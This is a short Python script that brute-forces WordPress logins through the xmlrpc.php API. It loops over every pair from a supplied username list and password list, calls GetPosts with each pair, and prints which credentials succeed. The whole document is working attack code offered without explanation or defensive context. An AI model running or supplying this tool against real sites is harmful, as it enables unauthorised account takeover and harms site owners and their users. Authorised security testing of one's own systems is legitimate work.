import argparse
from wordpress_xmlrpc import Client, WordPressPost
from wordpress_xmlrpc.methods.posts import GetPosts, NewPost
from wordpress_xmlrpc.methods.users import GetUserInfo
from wordpress_xmlrpc.exceptions import InvalidCredentialsError
import time

parser = argparse.ArgumentParser()
parser.add_argument("userlist", help="A text file containing a list of usernames")
parser.add_argument("passlist", help="A text file containing a list of passwords")
parser.add_argument("url", help="URL pointing to xmlrpc.php")
args = parser.parse_args()

users = [line.rstrip('\n') for line in open(args.userlist)]
passwords = [line.rstrip('\n') for line in open(args.passlist)]

for user in users:
    for password in passwords:
        time.sleep(0.5)
        wp = Client(args.url, user, password)
        try:
            wp.call(GetPosts())
            print("Success? u: " + user + " p: " + password)
        except InvalidCredentialsError:
            print("Fail? u: " + user + " p: " + password)
